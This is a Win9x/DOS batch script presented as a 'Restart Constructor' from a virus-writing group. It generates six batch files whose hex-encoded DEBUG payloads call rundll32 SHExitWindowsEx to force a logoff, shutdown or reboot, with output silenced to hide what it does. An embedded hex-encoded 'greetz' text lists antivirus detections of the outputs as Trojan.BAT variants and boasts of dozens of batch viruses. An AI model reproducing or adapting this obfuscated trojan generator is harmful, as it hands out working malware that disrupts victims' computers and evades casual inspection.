@echo off
:menu
echo.
echo.
echo                    ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
echo                    º Win9x and Dos Restart Constructor º
echo                    ÈÍÍ»    dvl2003ro@yahoo.co.uk    ÉÍÍ¼
echo                       ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
echo                       º           RC 5.0            º
echo                       º          CreatorZ           º  
echo                       º        Dvl and Ratty        º        
echo                    ÉÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍ»
echo                    º Viruses don't harm, ignorance do! º
echo                    ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
echo.
echo    Make a file(press a number from 1 to 6)
echo    ÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄÍÄ
echo.
echo    1 - Restart 1 (min.req. win95 + ie4.01)
echo    2 - Restart 2 (min.req. win95 + ie4.01)
echo    3 - Restart 3 (min.req. win95 + ie4.01)
echo    4 - Restart 4 (min.req. win95 + ie4.01)
echo    5 - Restart 5 (min.req. win95 + ie4.01)
echo    6 - Restart 6 (min.req. win95 + ie4.01)
echo.
echo    7 - Greetz and special thanX
echo    Q - Quit (Are u sure ???)
echo.
choice /c:1234567Q>nul
if errorlevel 8 goto done
if errorlevel 7 goto 7
if errorlevel 6 goto 6
if errorlevel 5 goto 5
if errorlevel 4 goto 4
if errorlevel 3 goto 3
if errorlevel 2 goto 2
if errorlevel 1 goto 1
echo CHOICE missing
goto done

:1
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_1
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_1
@echo e 0120  69 6E 64 6F 77 73 45 78 20 30 20 0D 0A 00>>restart_1
@echo rcx>>restart_1
@echo 2D>>restart_1
@echo n bat>>restart_1
@echo w>>restart_1
@echo q>>restart_1
@debug<restart_1
@ren bat restart_1.bat
@deltree/y bat >nul
@deltree/y restart_1 >nul 
ctty con
goto done

:2
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_2
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_2
@echo e 0120  69 6E 64 6F 77 73 45 78 20 38 20 0D 0A 00>>restart_2
@echo rcx>>restart_2
@echo 2D>>restart_2
@echo n bat>>restart_2
@echo w>>restart_2
@echo q>>restart_2
@debug<restart_2
@ren bat restart_2.bat
@deltree/y bat >nul
@deltree/y restart_2 >nul
ctty con
goto done

:3
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_3
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_3
@echo e 0120  69 6E 64 6F 77 73 45 78 20 32 20 0D 0A 00>>restart_3
@echo rcx>>restart_3
@echo 2D>>restart_3
@echo n bat>>restart_3
@echo w>>restart_3
@echo q>>restart_3
@debug<restart_3
@ren bat restart_3.bat
@deltree/y bat >nul
@deltree/y restart_3 >nul
ctty con
goto done

:4
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_4
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_4
@echo e 0120  69 6E 64 6F 77 73 45 78 20 33 0D 0A 00>>restart_4
@echo rcx>>restart_4
@echo 2C>>restart_4
@echo n bat>>restart_4
@echo w>>restart_4
@echo q>>restart_4
@debug<restart_4
@ren bat restart_4.bat
@deltree/y bat >nul
@deltree/y restart_4 >nul
ctty con
goto done

:5
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_5
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_5
@echo e 0120  69 6E 64 6F 77 73 45 78 20 35 0D 0A 00>>restart_5
@echo rcx>>restart_5
@echo 2C>>restart_5
@echo n bat>>restart_5
@echo w>>restart_5
@echo q>>restart_5
@debug<restart_5
@ren bat restart_5.bat
@deltree/y bat >nul
@deltree/y restart_5 >nul
ctty con
goto done

:6
ctty nul
@echo e 0100  72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 73 68 65>>restart_6
@echo e 0110  6C 6C 33 32 2E 64 6C 6C 2C 53 48 45 78 69 74 57>>restart_6
@echo e 0120  69 6E 64 6F 77 73 45 78 20 36 0D 0A 00>>restart_6
@echo rcx>>restart_6
@echo 2C>>restart_6
@echo n bat>>restart_6
@echo w>>restart_6
@echo q>>restart_6
@debug<restart_6
@ren bat restart_6.bat
@deltree/y bat >nul
@deltree/y restart_6 >nul
ctty con
goto done

:7
ctty nul
@if exist gr33tZ.txt goto 8
@echo e 0100  52 65 73 74 61 72 74 20 43 6F 6E 73 74 72 75 63>>gr33tZ
@echo e 0110  74 6F 72 20 35 2E 30 20 62 79 20 44 56 4C 20 61>>gr33tZ
@echo e 0120  6E 64 20 52 61 74 74 79 0D 0A 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 0130  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 0140  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 0150  3D 3D 3D 3D 3D 3D 3D 3D 3D 0D 0A 0D 0A 54 68 69>>gr33tZ
@echo e 0160  73 20 75 74 69 6C 69 74 79 20 63 61 6E 20 65 61>>gr33tZ
@echo e 0170  73 69 6C 79 20 63 72 65 61 74 65 20 2E 62 61 74>>gr33tZ
@echo e 0180  20 66 69 6C 65 73 20 77 69 74 68 0D 0A 72 65 73>>gr33tZ
@echo e 0190  74 61 72 74 20 6F 72 20 73 69 6D 69 6C 61 72 20>>gr33tZ
@echo e 01A0  63 6F 6D 6D 61 6E 64 73 20 66 6F 72 20 6D 73 2D>>gr33tZ
@echo e 01B0  64 6F 73 20 61 6E 64 20 77 69 6E 39 78 0D 0A 73>>gr33tZ
@echo e 01C0  79 73 74 65 6D 73 2E 0D 0A 0D 0A 57 68 61 74 27>>gr33tZ
@echo e 01D0  73 20 6E 65 77 20 3F 20 0D 0A 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 01E0  3D 3D 3D 3D 3D 3D 0D 0A 2D 20 4B 61 76 20 64 65>>gr33tZ
@echo e 01F0  74 65 63 74 65 64 20 52 43 20 31 20 61 73 20 43>>gr33tZ
@echo e 0200  6F 6E 73 74 72 75 63 74 6F 72 2E 42 41 54 2E 52>>gr33tZ
@echo e 0210  65 73 74 61 72 74 2E 31 30 0D 0A 2D 20 4B 61 76>>gr33tZ
@echo e 0220  20 64 65 74 65 63 74 65 64 20 46 6F 72 63 65 2E>>gr33tZ
@echo e 0230  62 61 74 20 61 73 20 54 72 6F 6A 61 6E 2E 42 41>>gr33tZ
@echo e 0240  54 2E 52 65 73 74 61 72 74 0D 0A 2D 20 4B 61 76>>gr33tZ
@echo e 0250  20 64 65 74 65 63 74 65 64 20 52 43 20 32 20 61>>gr33tZ
@echo e 0260  73 20 43 6F 6E 73 74 72 75 63 74 6F 72 2E 42 41>>gr33tZ
@echo e 0270  54 2E 52 65 73 74 61 72 74 2E 32 30 0D 0A 2D 20>>gr33tZ
@echo e 0280  4B 61 76 20 64 65 74 65 63 74 65 64 20 52 65 73>>gr33tZ
@echo e 0290  74 61 72 74 31 2E 62 61 74 20 61 73 20 54 72 6F>>gr33tZ
@echo e 02A0  6A 61 6E 2E 42 41 54 2E 45 78 69 74 57 69 6E 64>>gr33tZ
@echo e 02B0  6F 77 73 2E 68 0D 0A 2D 20 4B 61 76 20 64 65 74>>gr33tZ
@echo e 02C0  65 63 74 65 64 20 52 65 73 74 61 72 74 32 2E 62>>gr33tZ
@echo e 02D0  61 74 20 61 73 20 54 72 6F 6A 61 6E 2E 42 41 54>>gr33tZ
@echo e 02E0  2E 52 65 62 6F 6F 74 2E 62 0D 0A 2D 20 4B 61 76>>gr33tZ
@echo e 02F0  20 64 65 74 65 63 74 65 64 20 52 65 73 74 61 72>>gr33tZ
@echo e 0300  74 34 2E 62 61 74 20 61 73 20 54 72 6F 6A 61 6E>>gr33tZ
@echo e 0310  2E 42 41 54 2E 45 78 69 74 57 69 6E 64 6F 77 73>>gr33tZ
@echo e 0320  2E 69 0D 0A 2D 20 4B 61 76 20 64 65 74 65 63 74>>gr33tZ
@echo e 0330  65 64 20 52 65 73 74 61 72 74 35 2E 63 6F 6D 20>>gr33tZ
@echo e 0340  61 73 20 54 72 6F 6A 61 6E 2E 52 65 62 6F 6F 74>>gr33tZ
@echo e 0350  70 63 2E 61 0D 0A 2D 20 4B 61 76 20 64 65 74 65>>gr33tZ
@echo e 0360  63 74 65 64 20 52 65 73 74 61 72 74 36 2E 63 6F>>gr33tZ
@echo e 0370  6D 20 61 73 20 54 72 6F 6A 61 6E 2E 52 65 62 6F>>gr33tZ
@echo e 0380  6F 74 70 63 2E 62 0D 0A 2D 20 4B 61 76 20 64 65>>gr33tZ
@echo e 0390  74 65 63 74 65 64 20 52 43 20 33 20 61 73 20 43>>gr33tZ
@echo e 03A0  6F 6E 73 74 72 75 63 74 6F 72 2E 42 41 54 2E 52>>gr33tZ
@echo e 03B0  65 73 74 61 72 74 2E 33 30 0D 0A 2D 20 4B 61 76>>gr33tZ
@echo e 03C0  20 64 65 74 65 63 74 65 64 20 52 43 20 34 20 61>>gr33tZ
@echo e 03D0  73 20 43 6F 6E 73 74 72 75 63 74 6F 72 2E 42 41>>gr33tZ
@echo e 03E0  54 2E 52 65 73 74 61 72 74 2E 34 30 0D 0A 2D 20>>gr33tZ
@echo e 03F0  4B 61 76 20 64 65 74 65 63 74 65 64 20 52 65 73>>gr33tZ
@echo e 0400  74 61 72 74 31 2E 62 61 74 20 61 73 20 54 72 6F>>gr33tZ
@echo e 0410  6A 61 6E 2E 42 41 54 2E 45 78 69 74 57 69 6E 64>>gr33tZ
@echo e 0420  6F 77 73 2E 6A 0D 0A 2D 20 4B 61 76 20 64 65 74>>gr33tZ
@echo e 0430  65 63 74 65 64 20 52 65 73 74 61 72 74 32 2E 62>>gr33tZ
@echo e 0440  61 74 20 61 73 20 54 72 6F 6A 61 6E 2E 42 41 54>>gr33tZ
@echo e 0450  2E 45 78 69 74 57 69 6E 64 6F 77 73 2E 6B 0D 0A>>gr33tZ
@echo e 0460  2D 20 4B 61 76 20 64 65 74 65 63 74 65 64 20 52>>gr33tZ
@echo e 0470  65 73 74 61 72 74 33 2E 62 61 74 20 61 73 20 54>>gr33tZ
@echo e 0480  72 6F 6A 61 6E 2E 42 41 54 2E 45 78 69 74 57 69>>gr33tZ
@echo e 0490  6E 64 6F 77 73 2E 6C 0D 0A 2D 20 4B 61 76 20 64>>gr33tZ
@echo e 04A0  65 74 65 63 74 65 64 20 52 65 73 74 61 72 74 34>>gr33tZ
@echo e 04B0  2E 62 61 74 20 61 73 20 54 72 6F 6A 61 6E 2E 42>>gr33tZ
@echo e 04C0  41 54 2E 45 78 69 74 57 69 6E 64 6F 77 73 2E 6D>>gr33tZ
@echo e 04D0  0D 0A 2D 20 4B 61 76 20 64 65 74 65 63 74 65 64>>gr33tZ
@echo e 04E0  20 52 65 73 74 61 72 74 35 2E 62 61 74 20 61 73>>gr33tZ
@echo e 04F0  20 54 72 6F 6A 61 6E 2E 42 41 54 2E 45 78 69 74>>gr33tZ
@echo e 0500  57 69 6E 64 6F 77 73 2E 6E 0D 0A 2D 20 4B 61 76>>gr33tZ
@echo e 0510  20 64 65 74 65 63 74 65 64 20 52 65 73 74 61 72>>gr33tZ
@echo e 0520  74 36 2E 62 61 74 20 61 73 20 54 72 6F 6A 61 6E>>gr33tZ
@echo e 0530  2E 42 41 54 2E 45 78 69 74 57 69 6E 64 6F 77 73>>gr33tZ
@echo e 0540  2E 67 0D 0A 0D 0A 50 72 6F 6A 65 63 74 73 20 62>>gr33tZ
@echo e 0550  79 20 6D 65 20 28 61 6E 64 20 52 61 74 74 79 29>>gr33tZ
@echo e 0560  3A 0D 0A 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 0570  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0D 0A>>gr33tZ
@echo e 0580  2D 20 50 72 6F 6A 65 63 74 20 52 43 20 61 6C 69>>gr33tZ
@echo e 0590  61 73 20 52 65 73 74 61 72 74 20 43 6F 6E 73 74>>gr33tZ
@echo e 05A0  72 75 63 74 6F 72 20 28 76 20 31 2C 32 2C 33 2C>>gr33tZ
@echo e 05B0  34 2C 35 29 0D 0A 2D 20 50 72 6F 6A 65 63 74 20>>gr33tZ
@echo e 05C0  44 4D 20 61 6C 69 61 73 20 44 61 6E 67 65 72 6F>>gr33tZ
@echo e 05D0  75 73 20 4D 65 6E 75 20 28 76 20 31 2E 78 2C 20>>gr33tZ
@echo e 05E0  32 2E 78 2C 20 33 2E 78 29 0D 0A 20 20 69 6E 20>>gr33tZ
@echo e 05F0  63 6F 6C 61 62 6F 72 61 74 69 6F 6E 20 77 69 74>>gr33tZ
@echo e 0600  68 20 52 61 74 74 79 28 72 61 74 74 79 32 30 30>>gr33tZ
@echo e 0610  31 72 6F 40 79 61 68 6F 6F 2E 63 6F 6D 29 0D 0A>>gr33tZ
@echo e 0620  2D 20 50 72 6F 6A 65 63 74 20 45 6D 69 6C 69 61>>gr33tZ
@echo e 0630  20 28 76 20 61 2D 62 2D 63 2D 64 20 2B 20 72 65>>gr33tZ
@echo e 0640  76 69 73 69 6F 6E 20 76 65 72 73 69 6F 6E 73 29>>gr33tZ
@echo e 0650  0D 0A 2D 20 50 72 6F 6A 65 63 74 20 53 42 43 20>>gr33tZ
@echo e 0660  28 76 20 31 2E 30 2C 20 32 2E 30 29 0D 0A 2D 20>>gr33tZ
@echo e 0670  37 32 20 42 41 54 63 68 20 76 69 72 69 69 20 63>>gr33tZ
@echo e 0680  72 65 61 74 65 64 20 69 6E 20 63 6F 6C 61 62 6F>>gr33tZ
@echo e 0690  72 61 74 69 6F 6E 20 77 69 74 68 20 52 61 74 74>>gr33tZ
@echo e 06A0  79 0D 0A 20 20 28 72 61 74 74 79 32 30 30 31 72>>gr33tZ
@echo e 06B0  6F 40 79 61 68 6F 6F 2E 63 6F 6D 29 2E 0D 0A 2D>>gr33tZ
@echo e 06C0  20 4A 75 6E 6B 20 52 65 6D 6F 76 65 72 20 35 2E>>gr33tZ
@echo e 06D0  30 20 46 69 6E 61 6C 20 45 64 69 74 69 6F 6E 0D>>gr33tZ
@echo e 06E0  0A 0D 0A 54 75 74 6F 72 69 61 6C 7A 20 6D 61 64>>gr33tZ
@echo e 06F0  65 20 62 79 20 6D 65 3A 0D 0A 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 0700  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0D>>gr33tZ
@echo e 0710  0A 2D 20 4C 65 61 72 6E 69 6E 67 20 42 41 54 63>>gr33tZ
@echo e 0720  68 20 61 6E 64 20 73 6F 6D 65 20 42 41 54 63 68>>gr33tZ
@echo e 0730  20 74 65 68 6E 69 71 75 65 73 20 77 69 74 68 20>>gr33tZ
@echo e 0740  44 56 4C 0D 0A 0D 0A 4E 6F 74 65 3A 20 49 66 20>>gr33tZ
@echo e 0750  75 20 77 61 6E 74 20 73 6F 6D 65 74 68 69 6E 67>>gr33tZ
@echo e 0760  20 66 72 6F 6D 20 61 6C 6C 20 74 68 6F 73 65 2C>>gr33tZ
@echo e 0770  20 6D 61 69 6C 20 6D 65 2E 0D 0A 3D 3D 3D 3D 0D>>gr33tZ
@echo e 0780  0A 0D 0A 57 68 65 72 65 20 74 6F 20 63 6F 6E 74>>gr33tZ
@echo e 0790  61 63 74 20 75 73 20 3F 0D 0A 3D 3D 3D 3D 3D 3D>>gr33tZ
@echo e 07A0  3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 3D 0D>>gr33tZ
@echo e 07B0  0A 2D 20 44 56 4C 20 20 20 20 20 20 2D 2D 3E 20>>gr33tZ
@echo e 07C0  64 76 6C 32 30 30 33 72 6F 40 79 61 68 6F 6F 2E>>gr33tZ
@echo e 07D0  63 6F 2E 75 6B 0D 0A 2D 20 52 61 74 74 79 20 20>>gr33tZ
@echo e 07E0  20 20 2D 2D 3E 20 72 61 74 74 79 32 30 30 31 72>>gr33tZ
@echo e 07F0  6F 40 79 61 68 6F 6F 2E 63 6F 6D 0D 0A 0D 0A 20>>gr33tZ
@echo e 0800  20 20 47 72 65 65 74 7A 20 61 6E 64 20 73 70 65>>gr33tZ
@echo e 0810  63 69 61 6C 20 31 30 78 20 67 6F 65 73 20 74 6F>>gr33tZ
@echo e 0820  3A 0D 0A 20 20 20 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D>>gr33tZ
@echo e 0830  2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D>>gr33tZ
@echo e 0840  2D 2D 2D 2D 2D 0D 0A 20 20 20 20 20 20 2D 20 4E>>gr33tZ
@echo e 0850  47 4C 20 2D 20 6D 79 74 68 5F 65 75 40 79 61 68>>gr33tZ
@echo e 0860  6F 6F 2E 63 6F 6D 0D 0A 20 20 20 20 20 20 2D 20>>gr33tZ
@echo e 0870  52 61 74 74 79 20 2D 20 72 61 74 74 79 32 30 30>>gr33tZ
@echo e 0880  31 72 6F 40 79 61 68 6F 6F 2E 63 6F 6D 20 61 6E>>gr33tZ
@echo e 0890  64 20 68 74 74 70 3A 2F 2F 72 61 74 74 79 2E 68>>gr33tZ
@echo e 08A0  6F 6D 65 2E 72 6F 2F 0D 0A 20 20 20 20 20 20 2D>>gr33tZ
@echo e 08B0  20 4B 61 73 70 65 72 73 6B 79 20 2D 20 77 77 77>>gr33tZ
@echo e 08C0  2E 6B 61 73 70 65 72 73 6B 79 2E 63 6F 6D 0D 0A>>gr33tZ
@echo e 08D0  20 20 20 20 20 20 2D 20 53 70 54 68 20 2D 20 53>>gr33tZ
@echo e 08E0  50 54 48 40 61 6F 6E 6D 61 69 6C 2E 61 74 20 61>>gr33tZ
@echo e 08F0  6E 64 20 77 77 77 2E 73 70 74 68 2E 64 65 2E 76>>gr33tZ
@echo e 0900  75 0D 0A 20 20 20 20 20 20 2D 20 53 61 64 31 63>>gr33tZ
@echo e 0910  20 2D 20 73 61 64 31 63 40 69 6E 74 65 72 66 72>>gr33tZ
@echo e 0920  65 65 2E 69 74 20 61 6E 64 20 68 74 74 70 3A 2F>>gr33tZ
@echo e 0930  2F 73 61 64 31 63 70 61 67 65 2E 73 75 70 65 72>>gr33tZ
@echo e 0940  65 76 61 2E 69 74 2F 0D 0A 20 20 20 20 20 20 2D>>gr33tZ
@echo e 0950  20 41 64 64 65 72 20 2D 20 61 64 64 65 72 5F 32>>gr33tZ
@echo e 0960  30 30 33 40 79 61 68 6F 6F 2E 63 6F 6D 0D 0A 20>>gr33tZ
@echo e 0970  20 20 20 20 20 2D 20 4D 6A 20 28 47 6F 74 65 6E>>gr33tZ
@echo e 0980  6B 73 29 20 2D 20 69 67 72 61 73 69 65 40 79 61>>gr33tZ
@echo e 0990  68 6F 6F 2E 63 6F 6D 0D 0A 20 20 20 20 20 20 2D>>gr33tZ
@echo e 09A0  20 4E 69 6E 6F 20 2D 20 64 72 6C 69 6B 73 40 79>>gr33tZ
@echo e 09B0  61 68 6F 6F 2E 63 6F 6D 0D 0A 20 20 20 20 20 20>>gr33tZ
@echo e 09C0  2D 20 41 6C 63 6F 50 61 75 6C 20 2D 20 68 74 74>>gr33tZ
@echo e 09D0  70 3A 2F 2F 61 6C 63 6F 70 61 75 6C 2E 63 6A 62>>gr33tZ
@echo e 09E0  2E 6E 65 74 2F 0D 0A 0D 0A 53 31 20 79 34 20 2E>>gr33tZ
@echo e 09F0  2E 2E 20 21 21 3F 20 00>>gr33tZ
@echo rcx>>gr33tZ
@echo 8F7>>gr33tZ
@echo n txt>>gr33tZ
@echo w>>gr33tZ
@echo q>>gr33tZ
@debug<gr33tZ
@ren txt gr33tZ.txt
@deltree/y txt >nul
@deltree/y gr33tZ >nul
@start /max c:\windows\notepad.exe gr33tZ.txt >nul
ctty con
goto done

:8
@start /max c:\windows\notepad.exe gr33tZ.txt >nul
goto done

:done
cls